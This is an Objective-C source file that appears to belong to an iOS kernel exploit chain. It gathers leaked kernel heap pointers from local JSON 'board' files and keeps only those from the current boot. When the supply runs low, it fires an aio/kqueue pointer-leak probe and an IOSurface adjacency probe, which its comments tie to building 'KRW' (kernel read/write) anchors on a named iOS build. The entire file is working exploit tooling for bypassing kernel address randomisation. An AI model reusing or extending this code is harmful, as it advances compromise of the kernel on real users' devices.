//
//  LabHeapAnchor.m — same-boot REAL heap-anchor loader (2026-11-19)
//
//  Reads the board store's leaks[] (kind=heap) and returns the freshest
//  entry whose timestamp falls inside THIS boot (kern.boottime). Provenance
//  is the board receipt itself — nothing here invents or derives a value.
//
#import "LabHeapAnchor.h"
#import "P159IOSurfaceAdjacency.h"
#import "P063AioKqueueLeak.h"
#import <Foundation/Foundation.h>
#import <sys/sysctl.h>

static NSString *labha_boot_uuid(void) {
    char buf[64];
    size_t len = sizeof(buf) - 1;
    if (sysctlbyname("kern.bootuuid", buf, &len, NULL, 0) != 0) return nil;
    buf[len] = 0;
    return [NSString stringWithFormat:@"%s", buf];
}

static uint64_t labha_boot_secs(void) {
    struct timeval tv;
    size_t len = sizeof(tv);
    if (sysctlbyname("kern.boottime", &tv, &len, NULL, 0) != 0) return 0;
    return (uint64_t)tv.tv_sec;
}

uint64_t LabHeapAnchorSameBoot(void) {
    uint64_t out[1] = {0};
    LabHeapAnchorsSameBoot(1, out);
    return out[0];
}

int LabHeapAnchorsSameBoot(int max, uint64_t *out) {
    if (!out || max <= 0) return 0;
    int written = 0;
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    if (docs.count == 0) return 0;
    NSString *dir = docs.firstObject;

    uint64_t boot = labha_boot_secs();
    if (boot == 0) return 0;
    NSString *bootUUID = labha_boot_uuid();

    NSDateFormatter *df = [[NSDateFormatter alloc] init];
    df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    df.dateFormat = @"yyyy-MM-dd HH:mm:ss z";   /* LabTime / board stamp */

    /* gather (value, date) pairs from both board stores, same-boot only */
    NSMutableArray<NSDictionary *> *cands = [NSMutableArray array];
    for (NSString *name in @[@"lum1na_board.json", @"p007_board.json"]) {
        NSString *path = [dir stringByAppendingPathComponent:name];
        /* 2026-11-19 crash receipt (P007OpenOnly-152718, EXC via
           objc_exception_throw inside JSONObjectWithData): a MISSING board
           file yields nil data and Foundation THROWS on nil — the debug
           app has no lum1na_board.json and crashed on EVERY cscali tap.
           Guard the data fetch AND wrap the parse. */
        @try {
            NSData *jd = [NSData dataWithContentsOfFile:path];
            if (!jd) continue;
            NSDictionary *board = [NSJSONSerialization JSONObjectWithData:jd
                                options:0 error:nil];
            if (![board isKindOfClass:[NSDictionary class]]) continue;
            for (NSDictionary *e in (board[@"leaks"] ?: @[])) {
            if (![e isKindOfClass:[NSDictionary class]]) continue;
            if (![e[@"kind"] isKindOfClass:[NSString class]] ||
                ![[e valueForKey:@"kind"] isEqualToString:@"heap"]) continue;
            NSString *vaStr = ([e[@"va"] isKindOfClass:[NSString class]]) ? e[@"va"] : nil;
            if (![vaStr hasPrefix:@"0x"]) continue;
            uint64_t va = strtoull(vaStr.UTF8String, NULL, 16);
            /* shape gate: kernel-pointer band only, and never a static */
            if (va == 0 || (va >> 48) != 0xffffULL) continue;
            if (va == 0xfffffe0007004000ULL) continue;   /* static_base, not heap */
            /* same-boot provenance: boot_uuid when the entry carries it
               (2026-11-19: bulletproof — no timezone-parse risk), else the
               legacy time-stamp check. */
            NSString *bu = ([e[@"boot_uuid"] isKindOfClass:[NSString class]]) ? e[@"boot_uuid"] : nil;
            NSDate *t = nil;
            if (bu.length > 0) {
                if (![bu isEqualToString:bootUUID]) continue;   /* different boot — never reuse */
                t = [NSDate date];   /* uuid-verified: stamp now for ordering */
            } else {
                NSString *ts = ([e[@"time"] isKindOfClass:[NSString class]]) ? e[@"time"] : nil;
                t = ts ? [df dateFromString:ts] : nil;
                if (!t) continue;
                if ([t timeIntervalSince1970] < (NSTimeInterval)boot - 1) continue;  /* clock skew slack */
            }
            if (t) [cands addObject:@{ @"va": @(va), @"t": t }];
            }
        } @catch (__unused NSException *e) { continue; }
    }
    /* freshest first, distinct values only */
    [cands sortUsingComparator:^NSComparisonResult(NSDictionary *a, NSDictionary *b) {
        return [(NSDate *)b[@"t"] compare:(NSDate *)a[@"t"]];
    }];
    for (NSDictionary *c in cands) {
        uint64_t va = [c[@"va"] unsignedLongLongValue];
        BOOL dup = NO;
        for (int i = 0; i < written; i++) if (out[i] == va) { dup = YES; break; }
        if (dup) continue;
        out[written++] = va;
        if (written >= max) break;
    }
    return written;
}

int LabHeapAnchorHarvestIfThin(int want) {
    uint64_t buf[8];
    int have = LabHeapAnchorsSameBoot(8, buf);
    if (have >= want) return have;
    /* 2026-11-20: the aio84530 leak is DETERMINISTIC on 23F77 — every
       kqueue-extinfo dump round shows the aio_workq_entry kptr (receipt
       2026-11-19 23:43, board 0xffffffe1d3431900). Harvest it FIRST so the
       KRW anchor supply stops depending on the p159 adjacency lottery.
       Read-only leak probe (fifo + SIGEV_KEVENT + extinfo dump — no close
       races, not the UAF churn). On fixed trains (27.x) it records nothing
       and the p159 lottery below stays the fallback. */
    (void)[P063AioKqueueLeak tap];
    have = LabHeapAnchorsSameBoot(8, buf);
    if (have >= want) return have;
    /* 2026-11-19 receipt: ONE harvest tap yields nothing on the sparse 17
       (the user's manual rhythm was "tap p159 a few times"). Two attempts,
       each an 8-round P159 tap — churn until the anchor set is stocked,
       bounded at 16 rounds total. Read-only, never blocks. */
    for (int att = 0; att < 2; att++) {
        (void)[P159IOSurfaceAdjacency tap];
        have = LabHeapAnchorsSameBoot(8, buf);
        if (have >= want) return have;
        usleep(500000);
    }
    return have;
}
